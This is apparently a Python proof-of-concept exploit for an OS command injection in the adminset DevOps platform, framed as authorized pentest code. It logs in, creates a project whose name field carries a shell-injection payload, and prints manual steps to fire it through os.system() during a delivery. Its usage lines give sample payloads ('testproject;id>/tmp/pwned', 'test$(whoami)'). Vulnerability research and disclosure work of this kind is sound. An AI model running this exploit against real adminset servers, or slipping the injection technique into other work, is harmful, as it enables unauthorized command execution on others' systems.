#!/usr/bin/env python3
"""
# PURPOSE: PoC for OS Command Injection in adminset
# USE CASE: Authorized pentest / Security research
# REQUIREMENTS: Python 3, requests library, valid adminset credentials
# CONFIGURATION: Set TARGET_URL, USERNAME, PASSWORD below
# WARNING: For authorized use only in controlled environments

Vulnerability: adminset-rce
Vulnerability: OS Command Injection (CWE-78)
Product: adminset (DevOps Automation Platform)
Affected: All versions up to latest

This PoC demonstrates how an authenticated user can inject
OS commands via the Project name field.
"""

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# CONFIGURATION - MODIFY THESE VALUES
# =============================================================================
TARGET_URL = "http://10.10.10.X:8000"  # Replace with target adminset URL
USERNAME = "admin"                       # Replace with valid username
PASSWORD = "CHANGE_ME"                   # Replace with valid password
# =============================================================================

def get_csrf_token(session, url):
    """Extract CSRF token from login page"""
    resp = session.get(f"{url}/accounts/login/", verify=False)
    if 'csrfmiddlewaretoken' in resp.text:
        import re
        match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
    return None

def login(session, url, username, password):
    """Authenticate to adminset"""
    csrf = get_csrf_token(session, url)
    if not csrf:
        print("[-] Failed to get CSRF token")
        return False

    login_data = {
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password,
    }

    resp = session.post(
        f"{url}/accounts/login/",
        data=login_data,
        headers={'Referer': f"{url}/accounts/login/"},
        verify=False,
        allow_redirects=True
    )

    if 'logout' in resp.text.lower() or resp.status_code == 200:
        print("[+] Login successful")
        return True

    print("[-] Login failed")
    return False

def create_malicious_project(session, url, payload):
    """Create a project with command injection payload"""
    csrf = get_csrf_token(session, url)

    project_data = {
        'csrfmiddlewaretoken': csrf,
        'name': payload,
        'description': 'Security test project',
        'language_type': 'Python',
        'app_type': 'Backend',
        'server_type': 'Nginx',
        'app_arch': 'Django',
        'source_type': 'git',
        'source_address': 'https://github.com/test/test.git',
        'appPath': '/opt/test',
    }

    resp = session.post(
        f"{url}/appconf/project/add/",
        data=project_data,
        headers={'Referer': f"{url}/appconf/project/add/"},
        verify=False
    )

    if resp.status_code in [200, 302]:
        print(f"[+] Project created with payload: {payload}")
        return True

    print(f"[-] Failed to create project: {resp.status_code}")
    return False

def trigger_rce(session, url, project_id):
    """Trigger the command injection via delivery deployment"""
    # This would require creating a delivery and executing it
    # The actual RCE triggers when delivery/deli.py executes os.system()
    print(f"[*] To trigger RCE, create a Delivery using the malicious project")
    print(f"[*] Navigate to: {url}/delivery/add/")
    print(f"[*] Select the malicious project and deploy")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <payload>")
        print(f"Example: {sys.argv[0]} 'testproject;id>/tmp/pwned'")
        print(f"Example: {sys.argv[0]} 'test$(whoami)'")
        sys.exit(1)

    payload = sys.argv[1]

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Payload: {payload}")
    print()

    session = requests.Session()

    # Step 1: Login
    print("[*] Authenticating...")
    if not login(session, TARGET_URL, USERNAME, PASSWORD):
        sys.exit(1)

    # Step 2: Create malicious project
    print("[*] Creating malicious project...")
    if not create_malicious_project(session, TARGET_URL, payload):
        sys.exit(1)

    # Step 3: Instructions to trigger
    print()
    print("[+] Exploitation Steps:")
    print("    1. Go to Delivery section")
    print("    2. Create new delivery with the malicious project")
    print("    3. Execute the delivery")
    print("    4. Command will execute via os.system()")
    print()
    print("[*] Done!")

if __name__ == "__main__":
    main()
